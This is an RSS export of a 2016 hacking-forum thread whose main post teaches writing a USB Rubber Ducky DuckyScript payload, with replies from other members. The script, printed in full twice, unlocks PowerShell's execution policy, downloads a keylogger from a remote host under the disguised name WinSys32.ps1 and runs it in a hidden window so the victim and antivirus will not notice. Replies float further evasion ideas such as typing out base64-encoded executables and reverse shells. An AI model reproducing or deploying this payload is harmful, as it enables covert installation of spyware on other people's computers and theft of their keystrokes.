<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Plug In To Win - DuckyScript [Part 1/3]</title>
    <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154</link>
    <description>Hey Mates!

This time I have a project of mine to share with you about the USB Rubber Ducky. Maybe some of you already heard of it, e.g. @Occupytheweb wrote an [article](http://www.hackers-arise.com/single-post/2016/09/13/Mr-Robot-Hacks-How-Angela-Stole-Her-Bosss-Password-Using-mimikatz) about its use in Mr. Robot.

At the end of this small series you should be able to write your own Scripts for hacking the box just with an USB Stick and without the need of knowledge of any programming language!

---
## Structure
Part 1: How to use DuckyScript for writing a FUD file downloader &amp; executor
Part 2: How to use Powershell (Microsofts new shell; reminds of the linux terminal) for writing a FUD KeyLogger [Bonus]
Part 3: How to build your own BadUSB for around 10$

---
## USB Rubber Ducky
[quote]&quot;If it quacks like a keyboard and types like a keyboard, it must be a keyboard.&quot;
~ [Rubber Ducky Wiki](http://usbrubberducky.com)[/quote]
This little quote tells us the main idea behind Bad USB. It&#39;s a technique to convince the computer that we are not a USB Stick (Which can&#39;t execute things on his own), but a completly normal and unsuspicious keyboard, controlled by the user. This is useful, because keyboards have the right to type (Wow, big surprise :wink:).

[quote]&quot;Humans use keyboards, and computers trust humans.&quot;
~ [Rubber Ducky Wiki](http://usbrubberducky.com)[/quote]
The computer thinks we&#39;re a normal user, who just wants to download a file via powershell. That&#39;s not something disallowed, so it goes pretty unnoticed. If any warnings pop up, like &quot;Don&#39;t trust files from the internet&quot;, we just press Enter and skip&#39;em, because the **keyboard rules!**

## Do I need the Rubber Ducky?
I recommend using a Rubber Ducky for the following stuff, but it&#39;s **not required**. In the third part I&#39;ll explain how to build your own Bad USB for about 10$! Anyway, this one will be much harder to reprogram and to work with, so I highly recommend you to buy a Rubbber Ducky, when you are hooked :smile:.

You can get it for 44.99$ at [Hak5hop](http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe). The decision is yours :wink:.

---
## DuckyScript - Introduction
Now we&#39;ve got an USB Stick with a personality disorder, which thinks it&#39;s a keyboard, but how does it know what it has to do on the target system? The answer is a script language, called DuckyScript. It&#39;s syntax is pretty straightforward, it&#39;s requirements are nearly not existent and the needed intelligence is just ridiculous :smile:.

### Requirements
- Any text editor
- Duckencoder

### Text Editor
I think you&#39;ll find one... gedit, Windows editor, vim, etc...

### Duckencoder
The default Duckencoder.jar can be found at [github](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Downloads). However, I&#39;ve had some problems due to different keyboard layouts and searched for an alternative, so I stumbled upon [this](https://forums.hak5.org/index.php?/topic/27257-encoder-duck-encoder-v263-released-011214/) thread. There you can download a custom version of the Duckencoder, which supports different keyboard layouts.

## DuckyScript - Our Script
I&#39;ll cover just the basics and not all the keys you can use, because they can be already found [here](http://usbrubberducky.com/#!duckyscript.md).

### Basics
- You have to write every command on a new line
- Don&#39;t use blank lines (Never read it, but they seemed to break my script :confused:)
- Use REM for comments
- Use STRING for typing normal letters (It presses automatically shift, when you use upper-case letters and symbols like !&quot;ยง$)
- Use GUI for pressing the Windos key
- Use ENTER for pressing ENTER (Wow, that&#39;s insane)
- Use DELAY for waiting between new commands

That&#39;s all, what I&#39;ve needed for writing my downloader &amp; executor script!

### Example Powershell Script Downloader &amp; Executor
```
REM Set Execution Policy
DELAY 2000
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 4000
STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
ENTER 
DELAY 1000
STRING J
ENTER
DELAY 300
```
First we set the Powershell `ExecutionPolicy` Setting to `Unrestricted`, so that our script can be executed on the target system. Maybe you&#39;ve noticed that we just change the CurrentUsers setting. This requires no special privileges and works as good as changing the whole machines settings.

```
REM Download Keylogger
STRING (new-object System.Net.WebClient).DownloadFile(&quot;http://example.net/keylogger.ps1&quot;, &quot;WinSys32.ps1&quot;)
ENTER
DELAY 2000
STRING exit
ENTER
DELAY 300
```
Next we&#39;re downloading the Powershell Script. This one uses the .Net WebClient, which can be called from within Powershell (During my little journey through Keyloggers I&#39;ve found Powershell just awesome; I highly recommend everyone to have a look at it. Maybe I&#39;ll make some basic tutorials about it in the future :wink:). The command Downloads  the file from the given Web-site, where you&#39;ve put the script (http://example.net/keylogger.ps1) and saves them under the given directory (As an example I use the current directory (Users directory) and the name &quot;WinSys32.ps1&quot;). Then we leave the Powershell console.

```
REM Run Keylogger
GUI r
DELAY 300
STRING powershell -windowstyle hidden ./WinSys32.ps1
ENTER
```
Finally we run the Script as a background powershell process. This has two big advantages:
- The user can&#39;t spot it easily
- It runs under the name &quot;Windows Powershell&quot; with the default Powershell Icon. No user will think his own windows spys on him :grin:. (Oh, and AVs don&#39;t care either; more on that in the next part)

### Full Script
Here&#39;s the full script, so that you don&#39;t have to put the pieces together :wink:.
```
REM Download &amp; Execute Powershell Script
REM ~ TheDoctor v1.3.3.7
REM Set Execution Policy
DELAY 2000
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 4000
STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
ENTER 
DELAY 1000
STRING J
ENTER
DELAY 300
REM Download Keylogger
STRING (new-object System.Net.WebClient).DownloadFile(&quot;http://example.net/keylogger.ps1&quot;, &quot;WinSys32.ps1&quot;)
ENTER
DELAY 2000
STRING exit
ENTER
DELAY 300
REM Run Keylogger
GUI r
DELAY 300
STRING powershell -windowstyle hidden ./WinSys32.ps1
ENTER
```

### How To Put That Script On Your Bad USB?
With the USB Rubber Ducky it&#39;s very easy. Just take the Micro-SD card, put it in a Micro-SD to SD adapter and plug it in your computer. Then build the script with the Duckencoder:

[quote]Duckencoder.jar -i MyScriptOfDestruction.txt -o inject.bin[/quote]

Or when you want to compile with a specified keyboard layout (Only possible with the modified Duckencoder)

[quote]Duckencoder.jar -i MyScriptOfDestruction.txt -o inject.bin -l de[/quote]

Where
-i is the input file
-o is the output file
-l is the keyboard layout (Check the link to the [thread](https://forums.hak5.org/index.php?/topic/27257-encoder-duck-encoder-v263-released-011214/) for all possible layouts)

Now copy the inject.bin (No other name is allowed! The script has to be named inject.bin) to the Micro-SD card and plug it back into your Rubber Ducky. Finished.

With Bad USB it&#39;s much more complicated, so I&#39;ll explain it in the third part of the series.

---
## Payload Collection
You can find many different DuckyScripts [here](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads). It&#39;s a good place to search for some techniques you can use, when writing your own scripts (Or to find scripts for trolling your friends, e.g. [this one](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---You-got-quacked%21) :wink:). There are some very interesting ones like [mimikatz](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---mimikatz-payload), [utilman exploit](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---utilman-exploit) or a [WIFI password grabber](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WiFi-password-grabber).

---
## Conclusion
Is it really that easy? Yes. Just write your own simple DuckyScript, plug in your Bad USB and... It&#39;s won :wink:. Oh, and don&#39;t forget that you feel like a real 1337 h4xx0r, when you just have to put in your Stick and see magically popping up windows, filling with commands without anyones interaction :sunglasses:.

In the next part we&#39;ll talk about the Powershell Script, you have to download. Don&#39;t expect a big introduction to Powershell, because I&#39;m just a beginner, but I&#39;m looking forward to explain you some basics.

|-TheDoctor-|</description>
    
    <lastBuildDate>Sun, 02 Oct 2016 14:51:23 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/14</link>
        <pubDate>Sun, 21 Jan 2018 00:42:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-14</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <p>Would be great! <img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=9" title=":grinning:" class="emoji" alt=":grinning:"></p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/13</link>
        <pubDate>Sun, 02 Oct 2016 14:51:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-13</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>Sorry, went off early yesterday, because I had to write an application for a work experience <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">. Iโll have a look at both of them and try to figure out how it works <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">. Maybe itโll get a place as the fourth part?</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/12</link>
        <pubDate>Sun, 02 Oct 2016 07:18:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-12</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <p>Looks nice! <img src="https://0x00sec.org/images/emoji/twitter/sunglasses.png?v=9" title=":sunglasses:" class="emoji" alt=":sunglasses:"> I also found TwinDuck, which seems to do similar things (but there are some problems with it as some people write on the internet). Are you on the IRC?</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/11</link>
        <pubDate>Sat, 01 Oct 2016 14:43:38 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-11</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>Iโve found <a href="http://usbrubberducky.com/#!resources.md#Community_Edition_Encoder_and_Firmware" rel="nofollow noopener">this one</a> <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">. If Iโm right this custom firmware is even able to be used as Mass Storage <strong>and</strong> Keyboardโฆ Maybe I can find some further information on that <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/10</link>
        <pubDate>Sat, 01 Oct 2016 14:32:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-10</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <p>Nope, thatโs not really what I wanted <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Just a question: After the DuckyScript has been executed, can the device be used to store data?</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/9</link>
        <pubDate>Sat, 01 Oct 2016 14:22:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-9</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>Yep, but that one is for identifying another plugged in USB Stick with the name โDUCKYโ, where it then looks for a specific .exe, which is then executed <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">. If youโre interested in it, I can write about it, but it require you to put in two Sticks (The Bad USB &amp; The Stick with the .exe).</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/8</link>
        <pubDate>Sat, 01 Oct 2016 13:57:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-8</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <p>Donโt know much about the rubber ducky (planning to get one <img src="https://0x00sec.org/images/emoji/twitter/grin.png?v=9" title=":grin:" class="emoji" alt=":grin:">), but did you have a look <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---runexe-from-sd" rel="nofollow noopener">here</a>?</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/7</link>
        <pubDate>Sat, 01 Oct 2016 13:47:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-7</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>Yep, thatโs the basic idea behind the <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---reverse-shell" rel="nofollow noopener">link</a> <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">. I think you wouldnโt even need the script he uses, just some powershell magic (As I said, I begin to love Powershell <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">).</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/6</link>
        <pubDate>Sat, 01 Oct 2016 13:01:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-6</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>I have an idea. You could base64 encrypt an executable; have it type it out and save it; then base64 decrypt.</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/5</link>
        <pubDate>Sat, 01 Oct 2016 12:57:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-5</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>I thought about it too, but it seems thereโs no way to use any files on the SD card. The Rubber Ducky emulates perfectly a normal keyboard and as such it canโt exchange data with the computer from itโs storage. I had two ideas to circumvent that:</p>
<ul>
<li>Write executables byte data hardcoded into the script (An example of that technique can be found <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---reverse-shell" rel="nofollow noopener">here</a>)</li>
<li>Write custom firmware, which runs .exe named โinject.exeโ from your SD card (Just an idea; probably it doesnโt work, because Windows forbids it? I think this would have been already implemented, when it could work <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">. Maybe some of the C guys here want to have a look at the Rubber Duckys firmware and the ability of running arbitrary code? It could be read from the .exe on the SD card (Which seems to work; else DuckyScript shouldnโt work either) and run the given code in the keyboard drivers memory, isnโt it? You see, Iโm just speculating <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">. I hope more experienced low-levels can answer this questions <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">)</li>
</ul>
<p>Anyway, that would be awesome, if you could run any .exe without having to worry about downloads. And when it could be run in the drivers memory, it should have ring0 rights, which would be another benefit <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
<p>And <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> Christmas is near (At least almost near <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">). Maybe you can get one then <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/4</link>
        <pubDate>Sat, 01 Oct 2016 12:25:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-4</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[SmartOne]]></dc:creator>
        <description><![CDATA[
            <p>Great Work! Can you also cover how to interact with executables stored on the internal sd card in the next tutorials?</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/3</link>
        <pubDate>Sat, 01 Oct 2016 11:33:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-3</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>MATE! This is soooooo good. I love it. I seriously should consider getting oneโฆ I think when I save some money up itโll be on my list <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>Keep up the AWESOME work!</p>
          <p><a href="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154/2</link>
        <pubDate>Sat, 01 Oct 2016 10:03:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1154-2</guid>
        <source url="https://0x00sec.org/t/plug-in-to-win-duckyscript-part-1-3/1154.rss">Plug In To Win - DuckyScript [Part 1/3]</source>
      </item>
      <item>
        <title>Plug In To Win - DuckyScript [Part 1/3]</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p>Hey Mates!</p>
<p>This time I have a project of mine to share with you about the USB Rubber Ducky. Maybe some of you already heard of it, e.g. <a class="mention" href="https://0x00sec.org/u/occupytheweb">@Occupytheweb</a> wrote an <a href="http://www.hackers-arise.com/single-post/2016/09/13/Mr-Robot-Hacks-How-Angela-Stole-Her-Bosss-Password-Using-mimikatz" rel="nofollow noopener">article</a> about its use in Mr. Robot.</p>
<p>At the end of this small series you should be able to write your own Scripts for hacking the box just with an USB Stick and without the need of knowledge of any programming language!</p>
<hr>
<h2>Structure</h2>
<p>Part 1: How to use DuckyScript for writing a FUD file downloader &amp; executor<br>
Part 2: How to use Powershell (Microsofts new shell; reminds of the linux terminal) for writing a FUD KeyLogger [Bonus]<br>
Part 3: How to build your own BadUSB for around 10$</p>
<hr>
<h2>USB Rubber Ducky</h2>
<p>[quote]โIf it quacks like a keyboard and types like a keyboard, it must be a keyboard.โ<br>
~ <a href="http://usbrubberducky.com" rel="nofollow noopener">Rubber Ducky Wiki</a>[/quote]<br>
This little quote tells us the main idea behind Bad USB. Itโs a technique to convince the computer that we are not a USB Stick (Which canโt execute things on his own), but a completly normal and unsuspicious keyboard, controlled by the user. This is useful, because keyboards have the right to type (Wow, big surprise <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">).</p>
<p>[quote]โHumans use keyboards, and computers trust humans.โ<br>
~ <a href="http://usbrubberducky.com" rel="nofollow noopener">Rubber Ducky Wiki</a>[/quote]<br>
The computer thinks weโre a normal user, who just wants to download a file via powershell. Thatโs not something disallowed, so it goes pretty unnoticed. If any warnings pop up, like โDonโt trust files from the internetโ, we just press Enter and skipโem, because the <strong>keyboard rules!</strong></p>
<h2>Do I need the Rubber Ducky?</h2>
<p>I recommend using a Rubber Ducky for the following stuff, but itโs <strong>not required</strong>. In the third part Iโll explain how to build your own Bad USB for about 10$! Anyway, this one will be much harder to reprogram and to work with, so I highly recommend you to buy a Rubbber Ducky, when you are hooked <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">.</p>
<p>You can get it for 44.99$ at <a href="http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe" rel="nofollow noopener">Hak5hop</a>. The decision is yours <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
<hr>
<h2>DuckyScript - Introduction</h2>
<p>Now weโve got an USB Stick with a personality disorder, which thinks itโs a keyboard, but how does it know what it has to do on the target system? The answer is a script language, called DuckyScript. Itโs syntax is pretty straightforward, itโs requirements are nearly not existent and the needed intelligence is just ridiculous <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">.</p>
<h3>Requirements</h3>
<ul>
<li>Any text editor</li>
<li>Duckencoder</li>
</ul>
<h3>Text Editor</h3>
<p>I think youโll find oneโฆ gedit, Windows editor, vim, etcโฆ</p>
<h3>Duckencoder</h3>
<p>The default Duckencoder.jar can be found at <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Downloads" rel="nofollow noopener">github</a>. However, Iโve had some problems due to different keyboard layouts and searched for an alternative, so I stumbled upon <a href="https://forums.hak5.org/index.php?/topic/27257-encoder-duck-encoder-v263-released-011214/" rel="nofollow noopener">this</a> thread. There you can download a custom version of the Duckencoder, which supports different keyboard layouts.</p>
<h2>DuckyScript - Our Script</h2>
<p>Iโll cover just the basics and not all the keys you can use, because they can be already found <a href="http://usbrubberducky.com/#!duckyscript.md" rel="nofollow noopener">here</a>.</p>
<h3>Basics</h3>
<ul>
<li>You have to write every command on a new line</li>
<li>Donโt use blank lines (Never read it, but they seemed to break my script <img src="https://0x00sec.org/images/emoji/twitter/confused.png?v=9" title=":confused:" class="emoji" alt=":confused:">)</li>
<li>Use REM for comments</li>
<li>Use STRING for typing normal letters (It presses automatically shift, when you use upper-case letters and symbols like !"ยง$)</li>
<li>Use GUI for pressing the Windos key</li>
<li>Use ENTER for pressing ENTER (Wow, thatโs insane)</li>
<li>Use DELAY for waiting between new commands</li>
</ul>
<p>Thatโs all, what Iโve needed for writing my downloader &amp; executor script!</p>
<h3>Example Powershell Script Downloader &amp; Executor</h3>
<pre><code class="lang-auto">REM Set Execution Policy
DELAY 2000
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 4000
STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
ENTER 
DELAY 1000
STRING J
ENTER
DELAY 300
</code></pre>
<p>First we set the Powershell <code>ExecutionPolicy</code> Setting to <code>Unrestricted</code>, so that our script can be executed on the target system. Maybe youโve noticed that we just change the CurrentUsers setting. This requires no special privileges and works as good as changing the whole machines settings.</p>
<pre><code class="lang-auto">REM Download Keylogger
STRING (new-object System.Net.WebClient).DownloadFile("http://example.net/keylogger.ps1", "WinSys32.ps1")
ENTER
DELAY 2000
STRING exit
ENTER
DELAY 300
</code></pre>
<p>Next weโre downloading the Powershell Script. This one uses the .Net WebClient, which can be called from within Powershell (During my little journey through Keyloggers Iโve found Powershell just awesome; I highly recommend everyone to have a look at it. Maybe Iโll make some basic tutorials about it in the future <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">). The command Downloads  the file from the given Web-site, where youโve put the script (<a href="http://example.net/keylogger.ps1" rel="nofollow noopener">http://example.net/keylogger.ps1</a>) and saves them under the given directory (As an example I use the current directory (Users directory) and the name โWinSys32.ps1โ). Then we leave the Powershell console.</p>
<pre><code class="lang-auto">REM Run Keylogger
GUI r
DELAY 300
STRING powershell -windowstyle hidden ./WinSys32.ps1
ENTER
</code></pre>
<p>Finally we run the Script as a background powershell process. This has two big advantages:</p>
<ul>
<li>The user canโt spot it easily</li>
<li>It runs under the name โWindows Powershellโ with the default Powershell Icon. No user will think his own windows spys on him <img src="https://0x00sec.org/images/emoji/twitter/grin.png?v=9" title=":grin:" class="emoji" alt=":grin:">. (Oh, and AVs donโt care either; more on that in the next part)</li>
</ul>
<h3>Full Script</h3>
<p>Hereโs the full script, so that you donโt have to put the pieces together <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:">.</p>
<pre><code class="lang-auto">REM Download &amp; Execute Powershell Script
REM ~ TheDoctor v1.3.3.7
REM Set Execution Policy
DELAY 2000
GUI r
DELAY 300
STRING powershell
ENTER
DELAY 4000
STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
ENTER 
DELAY 1000
STRING J
ENTER
DELAY 300
REM Download Keylogger
STRING (new-object System.Net.WebClient).DownloadFile("http://example.net/keylogger.ps1", "WinSys32.ps1")
ENTER
DELAY 2000
STRING exit
ENTER
DELAY 300
REM Run Keylogger
GUI r
DELAY 300
STRING powershell -windowstyle hidden ./WinSys32.ps1
ENTER
</code></pre>
<h3>How To Put That Script On Your Bad USB?</h3>
<p>With the USB Rubber Ducky itโs very easy. Just take the Micro-SD card, put it in a Micro-SD to SD adapter and plug it in your computer. Then build the script with the Duckencoder:</p>
<aside class="quote no-group">
<blockquote>
<p>Duckencoder.jar -i MyScriptOfDestruction.txt -o inject.bin</p>
</blockquote>
</aside>
<p>Or when you want to compile with a specified keyboard layout (Only possible with the modified Duckencoder)</p>
<aside class="quote no-group">
<blockquote>
<p>Duckencoder.jar -i MyScriptOfDestruction.txt -o inject.bin -l de</p>
</blockquote>
</aside>
<p>Where<br>
-i is the input file<br>
-o is the output file<br>
-l is the keyboard layout (Check the link to the <a href="https://forums.hak5.org/index.php?/topic/27257-encoder-duck-encoder-v263-released-011214/" rel="nofollow noopener">thread</a> for all possible layouts)</p>
<p>Now copy the inject.bin (No other name is allowed! The script has to be named inject.bin) to the Micro-SD card and plug it back into your Rubber Ducky. Finished.</p>
<p>With Bad USB itโs much more complicated, so Iโll explain it in the third part of the series.</p>
<hr>
<h2>Payload Collection</h2>
